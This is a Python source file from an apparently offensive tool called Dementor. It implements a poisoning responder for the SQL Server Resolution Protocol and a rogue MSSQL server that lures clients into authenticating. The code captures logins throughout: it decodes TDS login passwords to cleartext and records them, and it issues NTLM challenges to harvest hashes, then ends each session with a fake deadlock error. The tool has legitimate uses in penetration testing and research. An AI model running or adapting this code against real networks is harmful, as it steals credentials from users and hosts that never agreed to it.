# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# SQL Server Resolution Protocol: [MS-SQLR]
#  - https://winprotocoldoc.z19.web.core.windows.net/MC-SQLR/%5bMC-SQLR%5d.pdf
# pyright: reportInvalidTypeForm=false, reportCallIssue=false

from impacket import tds, ntlm
from rich.markup import escape

from caterpillar.py import (
    FieldStruct,
    pack,
    struct,
    Const,
    uint32,
    uint8,
    CString,
    LittleEndian,
    Prefixed,
    uint16,
    unpack,
    StructException,
)

from dementor.database import _CLEARTEXT
from dementor.config.toml import TomlConfig, Attribute as A
from dementor.logger import ProtocolLogger
from dementor.protocols.ntlm import (
    NTLM_AUTH_CreateChallenge,
    ATTR_NTLM_ESS,
    ATTR_NTLM_CHALLENGE,
    NTLM_report_auth,
    NTLM_split_fqdn,
)
from dementor.servers import (
    BaseProtoHandler,
    ServerThread,
    ThreadingTCPServer,
    ThreadingUDPServer,
)
from dementor.filters import in_scope, ATTR_BLACKLIST, ATTR_WHITELIST


def apply_config(session):
    session.mssql_config = TomlConfig.build_config(MSSQLConfig)
    session.ssrp_config = TomlConfig.build_config(SSRPConfig)


def create_server_threads(session):
    servers = []
    if session.ssrp_enabled:
        servers.append(ServerThread(session, SSRPServer))

    if session.mssql_enabled:
        servers.append(ServerThread(session, MSSQLServer))

    return servers


# =============================================================================
# MS-SQLR
# =============================================================================

SSRP_CLNT_BCAST_EX = 0x02
SSRP_CLNT_UCAST_EX = 0x03
SSRP_CLNT_UCAST_INST = 0x04
SSRP_SVR_RESP = 0x05
SSRP_CLNT_UCAST_DAC = 0x0F


# 2.2.1 CLNT_BCAST_EX
@struct
class CLNT_BCAST_EX:
    op_num: Const(SSRP_CLNT_BCAST_EX, uint8)


# 2.2.2 CLNT_UCAST_EX
@struct
class CLNT_UCAST_EX:
    op_num: Const(SSRP_CLNT_UCAST_EX, uint8)


# 2.2.3 CLNT_UCAST_INST
@struct
class CLNT_UCAST_INST:
    op_num: Const(SSRP_CLNT_UCAST_INST, uint8)
    instance: CString()


# 2.2.4 CLNT_UCAST_DAC
@struct
class CLNT_UCAST_DAC:
    op_num: Const(SSRP_CLNT_UCAST_DAC, uint8)
    version: Const(0x01, uint8)
    instance: CString()


# 2.2.5 SVR_RESP
@struct(order=LittleEndian)
class SVR_RESP:
    op_num: Const(SSRP_SVR_RESP, uint8)
    data: Prefixed(uint16, encoding="utf-8")


# 2.2.6 SVR_RESP (DAC)
@struct(order=LittleEndian)
class SVR_RESP_DAC:
    op_num: Const(SSRP_SVR_RESP, uint8)
    resp_size: Const(0x06, uint16)
    version: Const(0x01, uint8)
    tcp_dac_port: uint16


class SSRPConfig(TomlConfig):
    _section_ = "SSRP"
    _fields_ = (
        [
            A("ssrp_server_name", "MSSQL.FQDN", "DEMENTOR"),
            A("ssrp_server_version", "MSSQL.Version", "9.00.1399.06"),
            A("ssrp_server_instance", "MSSQL.InstanceName", "MSSQLServer"),
            A("ssrp_instance_config", "InstanceConfig", ""),
            ATTR_WHITELIST,
            ATTR_BLACKLIST,
        ]
    )


class SSRPPoisoner(BaseProtoHandler):
    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "SSRP",
                "protocol_color": "steel_blue",
                "host": self.client_host,
                "port": 1434,
            }
        )

    def handle_data(self, data, transport) -> None:
        if not in_scope(self.client_host, self.config):
            return

        instance_name = self.config.ssrp_config.ssrp_server_instance
        if data[0] == SSRP_CLNT_UCAST_INST:
            # request for a specific instance
            try:
                req = unpack(CLNT_UCAST_INST, data)
                instance_name = req.instance
                self.logger.display(
                    f"Request for MSSQL server instance [i]{escape(instance_name)}[/]"
                )
            except StructException:
                # malformed packet
                return

        if data[0] == SSRP_CLNT_UCAST_DAC:
            port = self.config.mssql_config.mssql_port
            self.logger.success(
                f"Sending SRV_RESP_DAC for local port: {port} (i]{escape(instance_name)}[/])"
            )
            resp = SVR_RESP_DAC(tcp_dac_port=port)
            self.send(pack(resp))

        elif data[0] in (SSRP_CLNT_BCAST_EX, SSRP_CLNT_UCAST_EX, SSRP_CLNT_UCAST_INST):
            self.logger.success(
                f"Sending SVR_RESP with server config ([i]{instance_name}[/])"
            )
            name, _ = NTLM_split_fqdn(self.config.ssrp_config.ssrp_server_name)
            resp = SVR_RESP(
                data=(
                    f"ServerName;{name};"
                    f"InstanceName;{instance_name};"
                    "IsClustered;No;"
                    f"Version;{self.config.ssrp_config.ssrp_server_version};"
                    f"tcp;{self.config.mssql_config.mssql_port}"
                    f"{self.config.ssrp_config.ssrp_instance_config}"
                    ";;"
                )
            )
            self.send(pack(resp))


class SSRPServer(ThreadingUDPServer):
    default_port = 1434
    default_handler_class = SSRPPoisoner
    service_name = "SSRP"


# =============================================================================
# MS-SQL
# =============================================================================
class MSSQLConfig(TomlConfig):
    _section_ = "MSSQL"
    _fields_ = [
        A("mssql_port", "Port", 1433),
        A("mssql_server_version", "Version", "9.00.1399.06"),
        A("mssql_fqdn", "FQDN", "DEMENTOR", section_local=False),
        A("mssql_instance", "InstanceName", "MSSQLSerevr"),
        A("mssql_error_code", "ErrorCode", 1205),  # LK_VICTIM
        A("mssql_error_state", "ErrorState", 1),
        A("mssql_error_class", "ErrorClass", 14),
        A(
            "mssql_error_msg",
            "ErrorMessage",
            "You have been chosen as the deadlock victim",
        ),
        ATTR_NTLM_CHALLENGE,
        ATTR_NTLM_ESS,
    ]


# 2.2.6.4 PRELOGIN
@struct(order=LittleEndian)
class PL_OPTION_TOKEN_VERSION:
    major: uint8 = 15
    minor: uint8 = 0
    patch: uint16 = 2000
    sub_build: uint16 = 0x00

    def __str__(self) -> str:
        version_str = f"{self.major}.{self.minor}.{self.patch}"
        return version_str if not self.sub_build else f"{version_str}.{self.sub_build}"


@struct(order=LittleEndian)
class SSPI:
    token_type: uint8 = 0xED
    buffer: Prefixed(uint16)


class VARCHAR(FieldStruct):
    def __init__(self, sub) -> None:
        super().__init__()
        self.struct = sub

    def __size__(self, context) -> int:
        raise NotImplementedError

    def __type__(self) -> type:
        return str

    def unpack_single(self, context) -> str:
        size = self.struct.__unpack__(context)
        return context._io.read(size * 2).decode("utf-16le")

    def pack_single(self, obj, context) -> None:
        length = len(obj)
        self.struct.__pack__(length, context)
        context._io.write(obj.encode("utf-16le"))


# Even though, this gets packed successfully, the server won't be able
# to parse it
@struct(order=LittleEndian)
class TDS_ERROR:
    token_type: uint8 = tds.TDS_ERROR_TOKEN
    length: uint16 = 0
    number: uint32
    state: uint8
    class_: uint8
    msg: VARCHAR(uint16)
    server_name: VARCHAR(uint8)
    process_name: VARCHAR(uint8)
    line_number: uint16

    def length_hint(self) -> int:
        return (
            12
            + len(self.msg) * 2
            + len(self.server_name) * 2
            + len(self.process_name) * 2
        )


class MSSQLHandler(BaseProtoHandler):
    def __init__(self, config, request, client_address, server) -> None:
        self.challenge = None
        super().__init__(config, request, client_address, server)

    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "MSSQL",
                "protocol_color": "plum3",
                "host": self.client_host,
                "port": self.config.mssql_config.mssql_port,
            }
        )

    def handle_data(self, data, transport) -> None:
        while True:
            try:
                data = self.recv(8192)
                if not data:
                    break
            except OSError:
                break

            packet = tds.TDSPacket(data)
            code = None
            match packet["Type"]:
                case 18:  # TDS_PRE_LOGIN
                    code = self.handle_pre_login(packet)

                case 16:  # TDS_LOGIN
                    code = self.handle_login(packet)

                case 17:
                    code = self.handle_sspi(packet)

                case _:
                    self.send_error(packet)
                    code = 1

            if code:
                break

    def handle_pre_login(self, packet: tds.TDSPacket) -> int:
        pre_login = tds.TDS_PRELOGIN(packet["Data"])
        instance = pre_login["Instance"].decode(errors="replace") or "(blank)"
        version = pre_login["Version"]
        if packet["Data"][pre_login["EncryptionOffset"]] in (
            tds.TDS_ENCRYPT_REQ,
            tds.TDS_ENCRYPT_ON,
        ):
            self.logger.display(
                f"Pre-Login request for [i]{escape(instance)}[/] "
                "([bold red]Encryption requested[/])"
            )
        else:
            self.logger.display(
                f"PreLogin request for [i]{escape(instance)}[/] "
                f"(version: {unpack(PL_OPTION_TOKEN_VERSION, version)})"
            )

        pre_login = tds.TDS_PRELOGIN()
        version = self.config.mssql_config.mssql_server_version.split(".")
        target_version = PL_OPTION_TOKEN_VERSION()
        if len(version) >= 3:
            target_version.major = int(version[0])
            target_version.minor = int(version[1])
            target_version.patch = int(version[2])

        pre_login["Version"] = pack(target_version)
        pre_login["Encryption"] = tds.TDS_ENCRYPT_NOT_SUP
        pre_login["Instance"] = b"\x00"
        pre_login["InstanceLength"] = 1
        pre_login["ThreadID"] = b""
        pre_login["ThreadIDLength"] = 0
        self.send_response(
            tds.TDS_TABULAR,
            tds.TDS_STATUS_EOM,
            pre_login.getData(),
            packet,
        )
        return 0x00

    def handle_login(self, packet: tds.TDSPacket) -> int:
        login = tds.TDS_LOGIN(packet["Data"])
        username = login["UserName"].decode("utf-16le")
        password = login["Password"]
        extras = {
            attr_name: login[attr_name].decode("utf-16le")
            for attr_name in ("HostName", "AppName", "Database")
            if login[attr_name]
        }

        if password:  # most likely cleartext
            cleartext_password = self.decode_password(password)
            self.config.db.add_auth(
                client=self.client_address,
                credtype=_CLEARTEXT,
                username=username,
                password=cleartext_password,
                logger=self.logger,
                extras=extras,
            )
            self.send_error(packet)
            return 0x01

        if login["SSPI"]:
            sspi_buffer = login["SSPI"]
            try:
                negotiate = ntlm.NTLMAuthNegotiate()
                negotiate.fromString(sspi_buffer)
            except Exception:
                # invalid packet
                self.logger.debug(f"Invalid NTLMSSP packet: {sspi_buffer.hex()}")
                self.send_error(packet)
                return 1

            self.challenge = NTLM_AUTH_CreateChallenge(
                negotiate,
                *NTLM_split_fqdn(self.config.mssql_config.mssql_fqdn),
                challenge=self.config.mssql_config.ntlm_challenge,
                disable_ess=not self.config.mssql_config.ntlm_ess,
            )

            sspi = SSPI(buffer=self.challenge.getData())
            self.send_response(
                tds.TDS_TABULAR,
                tds.TDS_STATUS_EOM,
                pack(sspi),
                packet,
            )
            return 0

        self.send_error(packet)
        return 1  # terminate connection

    def handle_sspi(self, packet: tds.TDSPacket) -> int:
        raw_data = packet["Data"]
        try:
            auth_message = ntlm.NTLMAuthChallengeResponse()
            auth_message.fromString(raw_data)
        except Exception:
            self.logger.debug(f"Invalid NTLMSSP packet: {raw_data.hex()}")
            self.send_error(packet)
            return 1

        NTLM_report_auth(
            auth_message,
            challenge=self.challenge["challenge"],
            client=self.client_address,
            logger=self.logger,
            session=self.config,
        )
        self.send_error(packet)
        return 1

    def decode_password(self, password: bytes) -> str:
        return bytes(
            [
                (((byte ^ 0xA5) & 0xF0) >> 4) | (((byte ^ 0xA5) & 0x0F) << 4)
                for byte in password
            ]
        ).decode("utf-16le", errors="replace")

    def send_response(self, type: int, status: int, data: bytes, prev_pkt) -> None:
        packet = tds.TDSPacket()
        packet["Type"] = type
        packet["Status"] = status
        packet["Data"] = data
        packet["PacketID"] = prev_pkt["PacketID"] + 1
        packet["SPID"] = prev_pkt["SPID"]
        self.send(packet.getData())

    def send_error(self, prev_pkt) -> None:
        name = NTLM_split_fqdn(self.config.mssql_config.mssql_fqdn)[0]
        error = TDS_ERROR(
            number=self.config.mssql_config.mssql_error_code,
            state=self.config.mssql_config.mssql_error_state,
            class_=self.config.mssql_config.mssql_error_class,
            msg=self.config.mssql_config.mssql_error_msg,
            server_name=name,
            process_name="",
            line_number=1,
        )
        # currently, there is no better way to get the length
        error.length = error.length_hint()

        token_done = tds.TDS_DONE()
        token_done["TokenType"] = tds.TDS_DONE_TOKEN
        token_done["Status"] = 0x02  # Error
        token_done["CurCmd"] = 0
        token_done["DoneRowCount"] = 0
        self.send_response(
            tds.TDS_TABULAR,
            tds.TDS_STATUS_EOM,
            pack(error) + token_done.getData(),
            prev_pkt,
        )


class MSSQLServer(ThreadingTCPServer):
    default_port = 1433
    default_handler_class = MSSQLHandler
    service_name = "MSSQL"
